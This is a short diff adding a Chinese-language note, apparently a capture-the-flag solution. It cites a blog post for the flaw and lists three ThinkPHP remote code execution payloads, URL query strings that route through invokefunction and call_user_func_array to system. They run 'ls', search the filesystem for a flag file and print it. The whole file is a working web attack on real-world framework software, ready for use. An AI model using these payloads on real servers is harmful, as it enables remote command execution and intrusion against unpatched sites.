@@ -1,0 +1,9 @@
+漏洞原因： https://www.cnblogs.com/backlion/p/10106676.html
+
+payload=  
+1)
+?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
+2)
+?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name flag
+3)
+?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
